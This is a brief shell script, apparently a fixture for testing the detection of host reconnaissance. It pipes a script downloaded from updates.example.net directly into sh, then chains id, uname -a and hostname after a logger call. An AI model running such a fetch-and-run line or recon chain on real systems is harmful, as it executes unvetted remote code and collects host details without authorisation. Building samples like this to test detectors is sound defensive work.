#!/bin/sh
# Spaced mid-chain host recon: covers the mid-chain id/uname/hostname forms.
curl -fsSL https://updates.example.net/init.sh | sh
logger -t provision "host check"; id ; uname -a ; hostname
